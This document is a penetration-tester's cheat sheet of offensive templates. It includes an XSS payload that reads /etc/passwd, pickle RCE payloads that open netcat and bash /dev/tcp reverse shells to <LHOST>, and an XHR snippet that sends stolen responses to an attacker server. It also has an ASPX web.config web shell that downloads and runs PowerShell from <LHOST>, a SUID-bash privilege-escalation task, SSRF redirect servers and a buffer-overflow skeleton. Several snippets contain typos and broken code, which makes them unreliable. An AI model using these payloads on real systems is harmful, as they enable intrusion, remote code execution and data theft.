# Templates

## 01 Information Gathering
## 02 Vulnerability Analysis
## 03 Web Application Analysis

### HTML Injection

```c
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

### JSON POST Request with Authentication

```c
POST /<PATH> HTTP/1.1
Host: <RHOST>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Content-Type: application/json
Content-Length: 95
Connection: close

{
  "auth":{
    "name":"<USERNAME>",
    "password":"<PASSWORD>"
  },
  "filename":"<FILE>"
}
```

### Python Pickle RCE

```python
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat <LHOST> <LHOST> > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```

```python
import base64
import pickle
import os

class RCE:
	def __reduce__(self):
		cmd = ("/bin/bash -c 'exec bash -i &>/dev/tcp/<LHOST>/<LPORT> <&1'")
		return = os.system, (cmd, )

if __name__ == '__main__':
	pickle = pickle.dumps(RCE())
	print(bas64.b64encode(pickled))
```

### Python Redirect for SSRF

```python
#!/usr/bin/python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
  def do_GET(self):
      self.send_response(302)
      self.send_header('Location', sys.argv[1])
      self.end_headers()

HTTPServer(("0.0.0.0", 80), Redirect).serve_forever()
```

> sudo python3 redirect.py http://127.0.0.1:3000/

```python
#!/usr/bin/env python

import SimpleHTTPServer
import SocketServer
import sys
import argparse

def redirect_handler_factory(url):
    """
    returns a request handler class that redirects to supplied `url`
    """
    class RedirectHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
       def do_GET(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

       def do_POST(self):
           self.send_response(301)
           self.send_header('Location', url)
           self.end_headers()

    return RedirectHandler


def main():

    parser = argparse.ArgumentParser(description='HTTP redirect server')

    parser.add_argument('--port', '-p', action="store", type=int, default=80, help='port to listen on')
    parser.add_argument('--ip', '-i', action="store", default="", help='host interface to listen on')
    parser.add_argument('redirect_url', action="store")

    myargs = parser.parse_args()

    redirect_url = myargs.redirect_url
    port = myargs.port
    host = myargs.ip

    redirectHandler = redirect_handler_factory(redirect_url)

    handler = SocketServer.TCPServer((host, port), redirectHandler)
    print("serving at port %s" % port)
    handler.serve_forever()

if __name__ == "__main__":
    main()
```

### Python Web Request

```python
import requests
import re

http_proxy  = "http://127.0.0.1:8080"
proxyDict = {
              "http"  : http_proxy,
            }
// get a session
r = requests.get('http://')
// send request
r = requests.post('<TARGET_URL>', data={'key': 'value'}, cookies={'PHPSESSID': r.cookies['PHPSESSID']} , proxies=proxyDict)
```

### XML HTTP Request (XHR) in JavaScript


#### Payload

```c
var xhr = new XMLHttpRequest();
xhr = new XMLHttpRequest();
xhr.open('GET', 'http://localhost:8080/users/');
xhr.onreadystatechange = function() {
  var users = JSON.parse(xhr.responseText);
  if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
    for (var i = 0; i < users.length; ++i) {
      console.table(users[i]);
    }
  } else {
    console.error('There was a problem with the request. ' + users);
  }
}
xhr.send();
```

#### Forged Request

```c
myhttpserver = 'http://<LHOST>/'
targeturl = 'http://<TARGET_URL>/'

req = new XMLHttpRequest;
req.onreadystatechange = function() {
    if (req.readyState == 4) {
            req2 = new XMLHttpRequest;
            req2.open('GET', myhttpserver + btoa(this.responseText),false);
            req2.send();
        }
}
req.open('GET', targeturl, false);
req.send();
```

#### Simple Version

```c
req = new XMLHTTPRequest;
req.open('GET',"http://<TARGET_URL>/revshell.php");
req.send();
```

## 04 Database Assessment
## 05 Password Attacks
## 06 Wireless Attacks
## 07 Reverse Engineering
## 08 Exploitation Tools

### Web Shells

#### ASPX

```c
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
   <system.webServer>
      <handlers accessPolicy="Read, Script, Write">
         <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
      </handlers>
      <security>
         <requestFiltering>
            <fileExtensions>
               <remove fileExtension=".config" />
            </fileExtensions>
            <hiddenSegments>
               <remove segment="web.config" />
            </hiddenSegments>
         </requestFiltering>
      </security>
   </system.webServer>
</configuration>
<!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!
<%
Set s = CreateObject("WScript.Shell")
Set cmd = s.Exec("cmd /c powershell -c IEX (New-Object Net.Webclient).downloadstring('http://<LHOST>/shellyjelly.ps1')")
o = cmd.StdOut.Readall()
Response.write(o)
%>
-->
```

## 09 Sniffing & Spoofing
## 10 Post Exploitation

### Bad YAML

```c
- hosts: localhost
  tasks:
    - name: badyml
      command: chmod +s /bin/bash
```

## 11 Forensics
## 12 Reporting Tools
## 13 Social Engineering Tools
## Basics

### SSH Program Execution

```python
#!/usr/bin/python
from pwn import *

s =  ssh(host='', user='', password='')
p = s.run('cd <PATH> && ./<vuln>')
p.recv()
p.sendline(<payload>)
p.interactive()
s.close()
```

## Exploiting

### Skeleton Exploit Python Script

> https://github.com/0xsyr0/Buffer_Overflow

```c
#!/usr/bin/python

import socket,sys

address = '127.0.0.1'
port = 9999
buffer = #TBD

try:
	print '[+] Sending buffer'
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((address,port))
	s.recv(1024)
	s.send(buffer + '\r\n')
except:
 	print '[!] Unable to connect to the application.'
 	sys.exit(0)
finally:
	s.close()
```
